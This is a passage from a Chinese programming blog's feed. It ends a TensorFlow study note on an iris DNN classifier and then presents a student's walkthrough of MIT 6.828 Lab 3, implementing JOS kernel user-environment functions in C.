x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> cross_validation<span class="token punctuation">.</span>train_test_split<span class="token punctuation">(</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">,</span> iris<span class="token punctuation">.</span>target<span class="token punctuation">,</span> test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Build 3 layer DNN with 10, 20, 10 units respectively.</span>
feature_columns <span class="token operator">=</span> tf<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>infer_real_valued_columns_from_input<span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>

classifier <span class="token operator">=</span> tf<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>DNNClassifier<span class="token punctuation">(</span>feature_columns<span class="token operator">=</span>feature_columns<span class="token punctuation">,</span> hidden_units<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> n_classes<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Fit and predict.</span>
classifier<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> steps<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>

predictions <span class="token operator">=</span> list<span class="token punctuation">(</span>classifier<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span> as_iterable<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
score <span class="token operator">=</span> metrics<span class="token punctuation">.</span>accuracy_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> predictions<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Accuracy: {0:f}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>运行结果 Accuracy: 0.933333</p>
<h4 id="1-_TF_Learn__28tf-contrib-learn_29"><a href="#1-_TF_Learn__28tf-contrib-learn_29" class="headerlink" title="1. TF Learn (tf.contrib.learn)"></a>1. TF Learn (tf.contrib.learn)</h4><p>TensorFlow的简单接口，TF Learn (tensorflow.contrib.learn)，提供已经实现的模型可供使用者简单的调用。类似scikit learn，通过简单的几行代码就可以开始深度学习。事实上TF Learn期初是Scikit Flow (SKFlow)这个独立的项目。</p>
<p>TF Learn可以导入数据，构造模型，模型拟合，评估准确性。很多模型可以调用，比如线性分类，线性回归，DNN分类器。</p>
<h4 id="2-_TF-Slim__28tf-contrib-slim_29"><a href="#2-_TF-Slim__28tf-contrib-slim_29" class="headerlink" title="2. TF-Slim (tf.contrib.slim)"></a>2. TF-Slim (tf.contrib.slim)</h4><p>TF-Slim可以用来简单构建、训练、评估神经网络。</p>
<h4 id="3-_TensorFlow_u4E4B_u4E0A_u7684_u9AD8_u7EA7APIs"><a href="#3-_TensorFlow_u4E4B_u4E0A_u7684_u9AD8_u7EA7APIs" class="headerlink" title="3. TensorFlow之上的高级APIs"></a>3. TensorFlow之上的高级APIs</h4><p>有很多基于TensorFlow的APIs， 比如Keras (keras@GitHub), TFLearn (tflearn@GitHub), 和 Pretty Tensor (prettytensor@GitHub)。现在据说Keras准备作为官方默认API了，Keras真的超级好用&gt; &lt;.</p>
<p>TFLearn支持ConvNets, LSTM, BiRNN, ResNets, Generative networks以及一些特征BatchNorm, PReLU.</p>
<p>当然啦，TensorFlow的目的不是提供开箱即用的机器学习工具箱，而是希望能够针对不同场景不同需求，更灵活的搭建合适的架构来自己使用。</p>
<h3 id="Data_Flow_Graph__28_u6570_u636E_u6D41_u56FE_29"><a href="#Data_Flow_Graph__28_u6570_u636E_u6D41_u56FE_29" class="headerlink" title="Data Flow Graph (数据流图)"></a>Data Flow Graph (数据流图)</h3><p>TF使用数据流图，所有的计算都在图(graphs)中。session(这个我也不知道中文该怎么称呼，感觉英文就挺好的)用来分配给变量内存。参考这篇文章什么是tensorflow session。总之就是图是用来定义计算的，session是执行图里的计算的。</p>
<p>note 1 结束了，感觉有点少，算是入坑的开头吧&gt; &lt;</p>
]]></content>
    
    <summary type="html">
    
      CS 20SI: Tensorflow的Deep Learning研究笔记(一)
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>MIT 6.828 Lab 3</title>
    <link href="http://xinqiu.me/2017/01/17/MIT-6.828-3/"/>
    <id>http://xinqiu.me/2017/01/17/MIT-6.828-3/</id>
    <published>2017-01-16T16:00:00.000Z</published>
    <updated>2017-04-24T02:29:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续开始Lab3，用户环境。</p>
<a id="more"></a>
<h2 id="u5E8F_u8A00"><a href="#u5E8F_u8A00" class="headerlink" title="序言"></a>序言</h2><p>这个lab要实现基础内核功能来保证被保护的用户模式环境正常运行。要为JOS内核添加数据结构，记录用户环境，创建单用户环境，加载程序镜像并运行。要让JOS内核能够处理系统调用和各种异常。</p>
<p><strong>注意</strong>：这里环境类似进程，用环境是为了与操作系统的进程做点区分，强调这是JOS的环境下。</p>
<h2 id="Part_A_3A__u7528_u6237_u73AF_u5883_u548C_u5F02_u5E38_u5904_u7406"><a href="#Part_A_3A__u7528_u6237_u73AF_u5883_u548C_u5F02_u5E38_u5904_u7406" class="headerlink" title="Part A: 用户环境和异常处理"></a>Part A: 用户环境和异常处理</h2><p><code>inc/env.h</code>包含了用户环境的定义，内核使用 <code>ENV</code> 数据结构记录每个用户环境，这里用户环境有点像上下文，这个lab只要创建一个环境，但要设计JOS内核让其支持多环境。</p>
<p>在<code>kern/env.c</code>中定义了三个全局变量:</p>
<ul>
<li>struct Env *envs = NULL;        // All environments</li>
<li>struct Env *curenv = NULL;        // The current env</li>
<li>static struct Env *env_free_list;    // Free environment list</li>
</ul>
<p>JOS运行以后，envs指针指向一个存放系统中各种环境的<code>Env</code>结构体数组。JOS内核支持最大<code>NENV</code>(2^10,宏定义在<code>inc/env.h</code>中)个同时活动的环境。</p>
<p>JOS内核用<code>env_free_list</code>维护所有不活动的<code>Env</code>结构体，类似空闲链表。内核使用<code>curenv</code>来表示当前运行的环境，内核启动之前这个变量是NULL。</p>
<h3 id="u73AF_u5883_u72B6_u6001"><a href="#u73AF_u5883_u72B6_u6001" class="headerlink" title="环境状态"></a>环境状态</h3><p><code>Env</code>结构体在<code>inc/env.h</code>中定义了:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> Env <span class="token punctuation">{</span>
    <span class="token keyword">struct</span> Trapframe env_tf<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Saved registers</span>
    <span class="token keyword">struct</span> Env <span class="token operator">*</span>env_link<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Next free Env</span>
    envid_t env_id<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Unique environment identifier</span>
    envid_t env_parent_id<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// env_id of this env's parent</span>
    <span class="token keyword">enum</span> EnvType env_type<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Indicates special system environments</span>
    <span class="token keyword">unsigned</span> env_status<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Status of the environment</span>
    uint32_t env_runs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Number of times environment has run</span>

    <span class="token comment" spellcheck="true">// Address space</span>
    pde_t <span class="token operator">*</span>env_pgdir<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Kernel virtual address of page dir</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p><strong>env_tf</strong>: 定义在<code>inc/trap.h</code>中，用来存放环境停止运行时寄存器的值。内核从用户模式切换为内核模式时也会保存寄存器的值，这样之后环境恢复的时候可以读取出来。</p>
<p><strong>env_link</strong>：指向<code>env_free_list</code>中的下一个<code>Env</code>, <code>env_free_list</code>指向空闲env链表的第一个env环境。</p>
<p><strong>env_id</strong>：当前Env环境的唯一id。即使用户环境终止，这个结构体被重新分配在同一块空间，这个id值还是不同的。</p>
<p><strong>env_parent_id</strong>：内核储存env_id环境的父用户环境id。</p>
<p><strong>env_type</strong>：用来区别特定环境。大部分情况是<code>ENV_TYPE_USER</code>。</p>
<p><strong>env_status</strong>：这个变量保存了以下几种值</p>
<ul>
<li>ENV_FREE： 这个Env结构体不活跃，因此在<code>env_free_list</code>中。</li>
<li>ENV_RUNNABLE：这个结构体对应的环境等待被运行。</li>
<li>ENV_RUNNING：这个结构体对应的环境正在运行。</li>
<li>ENV_NOT_RUNNABLE：当前环境是活跃的但没准备运行。比如等待其他环境进行IPC(进程通信)。</li>
<li>ENV_DYING：这是个僵尸环境，下一次陷入内核会被释放。</li>
</ul>
<p>如同Unix进程，JOS环境结合了线程和地址空间。线程通常由被保存的寄存器定义，地址空间由env_pgdir指向的页目录和页表定义。想要运行环境必须给CPU设置合适的寄存器和地址空间。</p>
<h3 id="u5206_u914D_u73AF_u5883_u6570_u7EC4"><a href="#u5206_u914D_u73AF_u5883_u6570_u7EC4" class="headerlink" title="分配环境数组"></a>分配环境数组</h3><p>修改mem_init()去分配一个Env数组envs。</p>
<h4 id="Exercise_1"><a href="#Exercise_1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><p>分配一个envs数组，这个数组包含Env结构体的实例NENV。和pages数组一样，这个envs应该映射到用户只读的UENVS(定义在<code>inc/memlayout.h</code>)，这样用户进程可以读取。通过修改mem_init()，首先是初始化envs指针，</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Make 'envs' point to an array of size 'NENV' of 'struct Env'.</span>
<span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
envs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Env<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">boot_alloc</span><span class="token punctuation">(</span>NENV<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>envs<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> NENV<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接着是准备映射，</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Map the 'envs' array read-only by the user at linear address UENVS</span>
<span class="token comment" spellcheck="true">// (ie. perm = PTE_U | PTE_P).</span>
<span class="token comment" spellcheck="true">// Permissions:</span>
<span class="token comment" spellcheck="true">//    - the new image at UENVS  -- kernel R, user R</span>
<span class="token comment" spellcheck="true">//    - envs itself -- kernel RW, user NONE</span>
<span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
<span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> UENVS<span class="token punctuation">,</span> PTSIZE<span class="token punctuation">,</span> <span class="token function">PADDR</span><span class="token punctuation">(</span>envs<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_U<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>通过<code>make qemu-nox</code>可看到<code>check_kern_pgdir() succeeded!</code>证明有用。</p>
<h3 id="u521B_u5EFA_u548C_u8FD0_u884C_u73AF_u5883"><a href="#u521B_u5EFA_u548C_u8FD0_u884C_u73AF_u5883" class="headerlink" title="创建和运行环境"></a>创建和运行环境</h3><p>完善<code>kern/env.c</code>使之能够运行一个用户环境。因为还没做文件系统，所以设置内核去加载一个静态二进制镜像，JOS将这个作为ELF可执行镜像嵌入内核。</p>
<p>Lab3的GNUmakefile生成若干二进制镜像在<code>obj/user/</code>目录。</p>
<p>在<code>kern/init.c</code>中的i386_init()中，运行这些二进制镜像的代码都在一个环境中。</p>
<h4 id="Exercise_2"><a href="#Exercise_2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><p> 完成 <code>env.c</code>的以下几个函数。</p>
<ul>
<li><p>env_init()：初始化envs数组中的所有Env结构体并添加到env_free_list中，同时调用env_init_percpu，用来配置硬件不同段，特权级0是内核段，特权级3是用户段。</p>
</li>
<li><p>env_setup_vm()：分配一个页目录给新的环境并初始化新环境地址空间的内核部分。</p>
</li>
<li><p>region_alloc()：分配以及映射物理内存到一个环境。</p>
</li>
<li><p>load_icode()：分析ELF二进制镜像，将其加载到新环境的用户地址空间。</p>
</li>
<li><p>env_create()：使用env_alloc创建一个环境，调用load_icode加载ELF。</p>
</li>
<li><p>env_run()： 在用户模式下运行一个环境。</p>
</li>
</ul>
<h5 id="env_init"><a href="#env_init" class="headerlink" title="env_init"></a>env_init</h5><p>初始化envs数组，因为envs中的env_link指向的是下一个env，所以这里有个技巧是从envs的最后一个元素向前遍历。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">env_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Set up envs array</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    env_free_list <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> NENV <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>env_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>env_status <span class="token operator">=</span> ENV_FREE<span class="token punctuation">;</span>
        envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>env_link <span class="token operator">=</span> env_free_list<span class="token punctuation">;</span>
        env_free_list <span class="token operator">=</span> <span class="token operator">&amp;</span>envs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// Per-CPU part of the initialization</span>
    <span class="token function">env_init_percpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="env_setup_vm"><a href="#env_setup_vm" class="headerlink" title="env_setup_vm"></a>env_setup_vm</h5><p>设置e-&gt;env_pgdir并初始化页目录，可以使用kern_pgdir作为模板。填上这个，计数器加一，将p转化为内核虚拟地址，然后以kern_pgdir为模板复制。</p>
<pre class=" language-c"><code class="language-c">p<span class="token operator">-></span>pp_ref<span class="token operator">++</span><span class="token punctuation">;</span>
e<span class="token operator">-></span>env_pgdir <span class="token operator">=</span> <span class="token function">page2kva</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memcpy</span><span class="token punctuation">(</span>e<span class="token operator">-></span>env_pgdir<span class="token punctuation">,</span> kern_pgdir<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h5 id="region_alloc"><a href="#region_alloc" class="headerlink" title="region_alloc"></a>region_alloc</h5><p>分配len字节的物理内存给env环境，之后映射到环境中的虚拟地址va。要注意的是，va和len都要进行对齐。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">region_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token comment" spellcheck="true">// (But only if you need it for load_icode.)</span>
    <span class="token comment" spellcheck="true">//</span>
    <span class="token comment" spellcheck="true">// Hint: It is easier to use region_alloc if the caller can pass</span>
    <span class="token comment" spellcheck="true">//   'va' and 'len' values that are not page-aligned.</span>
    <span class="token comment" spellcheck="true">//   You should round va down, and round (va + len) up.</span>
    <span class="token comment" spellcheck="true">//   (Watch out for corner-cases!)</span>
    <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    va <span class="token operator">=</span> <span class="token function">ROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span> end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ROUNDUP</span><span class="token punctuation">(</span>va <span class="token operator">+</span> len<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> va <span class="token operator">&lt;=</span> end<span class="token punctuation">;</span> va<span class="token operator">+</span><span class="token operator">=</span>PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token function">page_alloc</span><span class="token punctuation">(</span>ALLOC_ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"allocation failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// pte_t *pte = pgdir_walk(e->env_pgdir, va, true);</span>
        <span class="token comment" spellcheck="true">// if (!pte)</span>
        <span class="token comment" spellcheck="true">//     panic("Unable to alloc page.");</span>

        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">page_insert</span><span class="token punctuation">(</span>e<span class="token operator">-></span>env_pgdir<span class="token punctuation">,</span> p<span class="token punctuation">,</span> va<span class="token punctuation">,</span> PTE_U <span class="token operator">|</span> PTE_W<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Page mapping failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre>
<h5 id="load_icode"><a href="#load_icode" class="headerlink" title="load_icode"></a>load_icode</h5><p>加载可读的ELF二进制镜像到用户环境内存，起始虚拟地址在ELF程序头部应该有，同时将这些段清零，和boot loader类似，之后映射给程序初始栈的一个页。只加载ph-&gt;p_type == ELF_PROG_LOAD的段，每个段的虚拟地址应该在ph-&gt;p_va，它的大小应该是ph-&gt;p_memsz。<code>binary + ph-&gt;p_offset</code>之后的ph-&gt;p_filesz字节要拷贝到虚拟地址ph-&gt;p_va，其他剩余内存应该清零。这个挺难的，我参考了这个<a href="http://grid.hust.edu.cn/zyshao/Teaching_Material/OSEngineering/Chapter5.pdf" target="_blank" rel="external">抢占式调度(lab3) 5.3.2.2</a>。这里一定要注意lcr3()这个函数，通过lcr3指令把页目录表的起始地址存入CR3寄存器，这里的拷贝到指定的虚地址处，是指用户空间的虚地址，而不是内核空间的虚地址，所以还需要用lcr3函数加载用户空间的页表目录才能将地址转换为用户空间地址。参考<a href="http://www.cnblogs.com/bdhmwz/p/5071081.html" target="_blank" rel="external">bdhmwz的MIT 6.828 JOS/XV6 lab3–PARTA</a>。因为这个问题折腾了半天括弧哭。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">load_icode</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">,</span> uint8_t <span class="token operator">*</span>binary<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">struct</span> Proghdr <span class="token operator">*</span>ph<span class="token punctuation">,</span> <span class="token operator">*</span>eph<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> Elf <span class="token operator">*</span>elf_head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Elf <span class="token operator">*</span><span class="token punctuation">)</span>binary<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>elf_head<span class="token operator">-></span>e_magic <span class="token operator">!=</span> ELF_MAGIC<span class="token punctuation">)</span> 
        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"ELF binary image error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">lcr3</span><span class="token punctuation">(</span><span class="token function">PADDR</span><span class="token punctuation">(</span>e<span class="token operator">-></span>env_pgdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ph <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Proghdr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint8_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>elf_head<span class="token punctuation">)</span> <span class="token operator">+</span> elf_head<span class="token operator">-></span>e_phoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    eph <span class="token operator">=</span> ph <span class="token operator">+</span> elf_head<span class="token operator">-></span>e_phnum<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> ph <span class="token operator">&lt;</span> eph<span class="token punctuation">;</span> ph<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ph<span class="token operator">-></span>p_type <span class="token operator">==</span> ELF_PROG_LOAD<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">region_alloc</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ph<span class="token operator">-></span>p_va<span class="token punctuation">,</span> ph<span class="token operator">-></span>p_memsz<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>ph<span class="token operator">-></span>p_va<span class="token punctuation">,</span>binary<span class="token operator">+</span>ph<span class="token operator">-></span>p_offset<span class="token punctuation">,</span>ph<span class="token operator">-></span>p_filesz<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ph<span class="token operator">-></span>p_va <span class="token operator">+</span> ph<span class="token operator">-></span>p_filesz<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>ph<span class="token operator">-></span>p_memsz<span class="token operator">-</span>ph<span class="token operator">-></span>p_filesz<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    e<span class="token operator">-></span>env_tf<span class="token punctuation">.</span>tf_eip <span class="token operator">=</span> elf_head<span class="token operator">-></span>e_entry<span class="token punctuation">;</span>
    <span class="token function">lcr3</span><span class="token punctuation">(</span><span class="token function">PADDR</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// Now map one page for the program's initial stack</span>
    <span class="token comment" spellcheck="true">// at virtual address USTACKTOP - PGSIZE.</span>

    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token function">region_alloc</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>USTACKTOP <span class="token operator">-</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="env_create"><a href="#env_create" class="headerlink" title="env_create"></a>env_create</h5><p>使用env_alloc创建一个env，调用load_icode来加载elf二进制镜像，设置env_type。这个env的父id应该设为0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">env_create</span><span class="token punctuation">(</span>uint8_t <span class="token operator">*</span>binary<span class="token punctuation">,</span> <span class="token keyword">enum</span> EnvType type<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">;</span>
    <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">env_alloc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span>
        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"env_alloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">load_icode</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> binary<span class="token punctuation">)</span><span class="token punctuation">;</span>
    e<span class="token operator">-></span>env_type <span class="token operator">=</span> type<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="env_run"><a href="#env_run" class="headerlink" title="env_run"></a>env_run</h5><p>切换上下文，首先判断当前环境是否为空，环境状态是不是ENV_RUNNING，之后将curenv指向新的环境，状态设为ENV_RUNNING，更新env_runs计数器，用lcr3切换到它的地址空间，使用env_pop_tf()储存环境计算器。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">env_run</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env <span class="token operator">*</span>e<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>curenv <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> curenv<span class="token operator">-></span>env_status <span class="token operator">==</span> ENV_RUNNING<span class="token punctuation">)</span>
        curenv<span class="token operator">-></span>env_status <span class="token operator">=</span> ENV_RUNNABLE<span class="token punctuation">;</span>
    curenv <span class="token operator">=</span> e<span class="token punctuation">;</span>
    curenv<span class="token operator">-></span>env_status <span class="token operator">=</span> ENV_RUNNING<span class="token punctuation">;</span>
    curenv<span class="token operator">-></span>env_runs<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token function">lcr3</span><span class="token punctuation">(</span><span class="token function">PADDR</span><span class="token punctuation">(</span>curenv<span class="token operator">-></span>env_pgdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">env_pop_tf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>curenv<span class="token operator">-></span>env_tf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"env_run not yet implemented"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这时候<code>make qemu-nox</code>运行时会出现内存相关错误，暂时不需要担心。</p>
<p>来看一下程序启动的调用顺序图</p>
<ul>
<li>start (kern/entry.S)</li>
<li>i386_init (kern/init.c)<ul>
<li>cons_init</li>
<li>mem_init</li>
<li>env_init</li>
<li>trap_init (still incomplete at this point)</li>
<li>env_create</li>
<li>env_run<ul>
<li>env_pop_tf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>编译完内核并且运行在QEMU中，正常情况应该是系统进入用户空间，执行hello二进制程序直到系统int指令。然而因为JOS还没有设置硬件使用户过渡到内核，所以会出现问题。当CPU发现系统不能处理系统调用中断，会生成一个通用保护异常，进而又产生一个双重错误异常，同样因为解决不了，最终会导致三重错误(triple fault)。通常需要重启使CPU复位，这很麻烦，还好是在QEMU中，就会出现寄存器dump。</p>
<p>使用debugger去检查是否进入用户模式。使用<code>make qemu-gdb</code>然后在env_pop_tf处打断点。使用si单步调试，处理器执行iret指令之后的命令。</p>
<h3 id="u5904_u7406_u4E2D_u65AD_u548C_u5F02_u5E38"><a href="#u5904_u7406_u4E2D_u65AD_u548C_u5F02_u5E38" class="headerlink" title="处理中断和异常"></a>处理中断和异常</h3><p>用户空间的系统调用指令 int $0x30 是终止：处理器进入用户模式但不能返回。所以要实现基础的异常和系统调用处理，这样内核就能从用户模式恢复控制权。</p>
